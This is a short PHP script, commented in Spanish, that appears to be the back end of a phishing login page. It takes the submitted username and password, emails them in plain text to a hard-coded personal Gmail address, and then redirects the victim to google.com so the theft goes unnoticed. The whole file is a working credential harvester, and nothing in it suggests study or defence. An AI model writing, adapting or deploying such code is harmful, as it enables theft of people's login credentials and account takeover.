<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contraseña = $_POST["contraseña"];

    // Configuración de correo electrónico
    $destinatario = "yosephnoe29@gmail.com";
    $asunto = "Inicio de sesión - Datos de usuario";
    $mensaje = "Usuario: $usuario\nContraseña: $contraseña";

    // Envío de correo electrónico
    mail($destinatario, $asunto, $mensaje);

    // Redireccionar a una página de éxito o mostrar un mensaje de éxito
    header("Location: https://www.google.com");
    exit();
}

